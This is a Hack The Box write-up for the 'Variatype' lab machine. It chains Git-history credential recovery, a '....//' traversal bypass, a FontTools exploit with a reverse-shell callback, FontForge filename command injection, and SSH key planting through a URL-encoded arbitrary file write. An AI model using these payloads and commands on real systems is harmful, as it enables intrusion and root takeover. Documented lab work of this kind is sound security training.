# Variatype - Hack The Box Writeup

**Category:** Linux  
**Difficulty:** Medium

---

# Enumeration

## Nmap

Initial scan revealed two open ports:

```text
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    nginx 1.22.1
```

---

## Subdomain Enumeration

Enumerating subdomains revealed:

```text
portal                  [Status: 200, Size: 2494, Words: 445, Lines: 59, Duration: 159ms]
```

---

# Initial Recon

Visiting the main site showed a functionality allowing users to upload:

* `.designspace` files
* Master fonts (`.ttf` / `.otf`)

These uploads were then used to generate fonts.

Seeing this functionality immediately brought to mind the relatively recent vulnerability tracked as:

```text
CVE-2026-2441
```

which affected how Chrome handled CSS fonts. At this point it was unclear whether it would be relevant, so further enumeration was required.

The site also stated:

```text
We use the same fonttools engine used by Google Fonts and major foundries.
```

Because of this, I installed FontTools locally and researched known vulnerabilities.

A critical vulnerability appeared:

```text
CVE-2025-66034
```

This vulnerability allows remote code execution in FontTools versions:

```text
4.33.0 -> before 4.60.2
```

However, the version running on the target was still unknown.

The website also mentioned:

```text
Rendering inconsistencies across browsers
```

which suggested uploaded fonts were likely being processed or rendered inside browser environments.

---

# Portal Subdomain

The portal subdomain contained a login page.

The authentication appeared custom, and common/default credentials did not work.

---

# Investigating CVE-2025-66034

To exploit the FontTools vulnerability we would need:

* Upload endpoint
* Filesystem write location
* Web-accessible trigger location

I generated a sample `.designspace` file with the help of AI and used FontMake to generate a `.ttf` file.

After uploading files, I identified:

**Upload endpoint**

```text
/tools/variable-font-generator/process
```

**Download directory**

```text
/download/<random>
```

Initially the exploit appeared unsuccessful.

---

## Testing File Write Behavior

### Test 1

Modified filename:

```text
filename="shell123.php"
```

Result:

* Random filename assigned
* PHP source displayed when visited

---

### Test 2

Modified filename:

```text
filename="../shell123.php"
```

Result:

* File written elsewhere
* PHP source still displayed

---

### Test 3

Modified filename:

```text
filename="/tmp/shell123.php"
```

Result:

* PHP source was NOT displayed

This strongly suggested the file was being written to:

```text
/tmp/
```

---

### Relative Path Testing

Further testing showed:

```text
filename="../../../../../tmp/shell123.php"
```

also worked.

Again, PHP source was not displayed.

This confirmed:

```text
Relative path traversal worked.
```

At this point, the remaining requirement was discovering the web root directory.

I also found a public proof-of-concept exploit which automated the upload process, allowing me to focus on finding the correct filesystem path.

---

# Exposed Git Repository

Directory enumeration on the portal subdomain revealed an exposed Git repository.

```text
/.git                 (Status: 301) [Size: 169] [--> http://portal.variatype.htb/.git/]
/.git/HEAD            (Status: 200) [Size: 23]
/.git/logs/           (Status: 403) [Size: 153]
/.git/config          (Status: 200) [Size: 143]
/.git/index           (Status: 200) [Size: 137]
/index.php            (Status: 200) [Size: 2494]
/download.php         (Status: 302) [Size: 0] [--> /]
/files                (Status: 301) [Size: 169] [--> http://portal.variatype.htb/files/]
/view.php             (Status: 302) [Size: 0] [--> /]
/auth.php             (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 0] [--> /]
```

---

## Dumping the Repository

Using Git-Dumper:

```bash
git-dumper http://portal.variatype.htb/.git/ ./portal-dump/
```

Inside `COMMIT_EDITMSG` I noticed:

```text
security: remove hardcoded credentials
```

No credentials existed in the current files.

This suggested the credentials had existed in a previous commit.

---

## Git History

Checking commit history:

```bash
git log --oneline
```

Output:

```text
753b5f5
5030e79
```

Viewing the older version of `auth.php`:

```bash
git show 753b5f5:auth.php
```

revealed credentials:

```text
gitbot:G1tB0t_Acc3ss_2025!
```

---

# Portal Access

Using the recovered credentials successfully authenticated us.

---

# Local File Inclusion

Inside `view.php` I observed:

```text
http://portal.variatype.htb/view.php?f=../../variabype_j5EVF1BaYIk.ttf
```

The application returned:

```text
Invalid file name
```

suggesting input validation existed.

A second endpoint appeared promising:

```text
/download.php?f=variabype_ieTGtB7u2QY.ttf
```

Attempting standard traversal:

```text
/download.php?f=../../../../etc/passwd
```

failed.

However:

```text
/download.php?f=....//....//....//....//....//....//....//etc/passwd
```

worked successfully.

---

## Why the Bypass Worked

A common but flawed mitigation is:

```php
str_replace("../", "", $input);
```

If this logic exists:

```text
....//
```

becomes:

```text
../
```

after replacement, effectively restoring traversal.

---

# Finding the Web Root

Using the LFI vulnerability, I retrieved:

```text
/etc/nginx/sites-enabled/portal.variatype.htb
```

which revealed the web root location.

---

# Exploiting CVE-2025-66034

With the web root known, I reran the exploit.

**Shell location**

```text
/var/www/portal.variatype.htb/public
```

**Trigger URL**

```text
http://portal.variatype.htb/
```

Exploit command:

```bash
python3 varlib_cve_2025_66034.py \
--ip 10.10.15.252 \
--port 4445 \
--url http://variatype.htb/tools/variable-font-generator/process \
--trigger http://portal.variatype.htb \
--path /var/www/portal.variatype.htb/public
```

This successfully provided a shell as:

```text
www-data
```

---

# Internal Service Enumeration

Running:

```bash
ss -tulnp
```

revealed an internal service on:

```text
5000/tcp
```

Querying it:

```bash
curl http://127.0.0.1:5000
```

showed a copy of the main site.

Further inspection:

```bash
curl -I http://127.0.0.1:5000
```

revealed:

```text
Werkzeug/3.1.4
Python/3.11.2
```

The application appeared to run as:

```text
variatype
```

using:

```text
app.py
```

Locating it:

```bash
find / -name "app.py" 2>/dev/null
```

showed application files under:

```text
/opt/variatype
```

---

# Steve's Processing Script

Inside `/opt` I found:

```text
process_client_submissions.bak
```

The script:

* Scanned `/var/www/portal.variatype.htb/public/files`
* Checked filename safety
* Validated fonts using FontForge
* Moved files to Steve's home directory
* Logged processing events

---

# FontForge Vulnerability

The installed FontForge version was vulnerable to:

```text
CVE-2024-25081
CVE-2024-25082
```

Most interesting was:

```text
CVE-2024-25081
```

where FontForge passes filenames to shell commands without proper sanitization.

---

# Privilege Escalation to Steve

Using a public PoC:

1. Create malicious filename containing payload
2. Embed file inside ZIP archive
3. Wait for FontForge processing
4. Payload executes

This successfully yielded a shell as:

```text
steve
```

---

# Sudo Enumeration

Checking sudo permissions:

```bash
sudo -l
```

revealed:

```text
/usr/bin/python3 /opt/font-tools/install_validator.py *
```

---

# install_validator.py Analysis

The script functioned as a plugin installer.

Features:

* Accepts arbitrary URLs
* Requires `http` or `https`
* Limits slash count
* Downloads plugins into:

```text
/opt/font-tools/validators/
```

The script used:

```python
PackageIndex.download()
```

Research revealed this function was vulnerable to arbitrary file writes.

---

## Vulnerability Details

Behavior:

1. Take supplied URL
2. Extract filename
3. Join filename with plugin directory
4. Save downloaded file

The only validation performed:

```python
filename.replace("..", ".")
```

This can be bypassed using URL-encoded absolute paths.

PoC:

```text
http://localhost:8000/%2fhome%2fuser%2f.ssh%2fauthorized_keys
```

The encoded slash:

```text
%2f
```

causes the path to be treated as absolute.

---

# Root via SSH Key Injection

Generate SSH keys:

```bash
ssh-keygen -t rsa -b 4096 -f ./root_key -N ""
```

Create directory structure:

```bash
mkdir -p root/.ssh
```

Place public key into:

```text
root/.ssh/authorized_keys
```

Host the directory:

```bash
python3 -m http.server 80
```

From the victim machine:

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
'http://10.10.15.252/%2froot%2f.ssh%2fauthorized_keys'
```

This wrote our public key into:

```text
/root/.ssh/authorized_keys
```

---

# Root Access

Using the generated private key:

```bash
ssh -i root_key root@variatype.htb
```

Root shell obtained.

---

# Lessons Learned

* Exposed Git repositories often reveal sensitive historical data.
* Deleted credentials frequently remain recoverable through Git history.
* LFI protections based on string replacement are easily bypassed.
* Font processing software has a long history of dangerous parsing vulnerabilities.
* Internal automation scripts can create unexpected privilege escalation paths.
* Arbitrary file write vulnerabilities become critical when combined with sudo permissions.
* SSH key injection remains one of the cleanest paths to root when arbitrary file writes are available.

---

# Attack Chain Summary

```text
Exposed Git Repository
        ↓
Recover Historical Credentials
        ↓
Portal Login
        ↓
LFI via Traversal Bypass
        ↓
Discover Web Root
        ↓
CVE-2025-66034 (FontTools RCE)
        ↓
Shell as www-data
        ↓
Discover Internal Processing Script
        ↓
CVE-2024-25081 (FontForge)
        ↓
Shell as steve
        ↓
Sudo install_validator.py
        ↓
PackageIndex.download() Arbitrary File Write
        ↓
SSH Authorized Keys Injection
        ↓
ROOT
```
